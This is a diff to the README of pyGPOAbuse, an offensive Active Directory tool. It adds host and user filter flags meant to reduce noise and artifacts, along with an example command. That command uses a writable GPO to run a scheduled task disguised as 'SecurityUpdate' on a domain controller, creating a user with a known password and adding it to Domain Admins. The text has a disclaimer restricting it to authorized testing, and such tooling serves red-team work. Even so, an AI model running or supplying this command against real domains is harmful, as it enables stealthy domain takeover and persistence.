@@ -1,5 +1,26 @@
 # pyGPOAbuse
 
+## Filter Additions by D4RKMATT3R
+- DISCLAIMER: This was only tested briefly in a local AD environment I take no responsibility for any unprecedented behavior or malfunctioning, it is provided as-is, for authorized testing only, entirely at your own risk.
+- Now supports filtered targeting of users or hosts similar to SharpGPOAbuse
+- Scenario: GPO is linked to the Active-Directory Domain therefore tasks would be applied to all affected objects within said domain (users/hosts) which would leave a ton of unnecesary noise and artifacts. Therefore a more targeted approach is preferred executing commands on specifc targets e.g. the domain controller.
+```bash
+Host/User targeting via filters (mirrors SharpGPOAbuse --FilterEnabled):
+  -filter-enabled       Enable GPO Host/User targeting so the scheduled task only runs for a specific host/user
+  -target-dns-name FQDN
+                        Computer task: DNS/FQDN of the only host that should run the task (e.g. dc01.corp.local)
+  -target-username DOMAIN\USER
+                        User task: only this user processes the task (format: DOMAIN\username)
+  -target-user-sid SID  User task: SID of the targeted user (optional, more robust matching)
+
+```
+### Example
+```bash
+# Add Domain user and add to Domain Admins via Domain-Controller
+python3 pygpoabuse.py red.local/user:Testing123 -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname SecurityUpdate  -dc-ip 192.168.152.2 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.red.local
+```
+
+
 ## Description
 
 Python **partial** implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) by[@pkb1s](https://twitter.com/pkb1s)
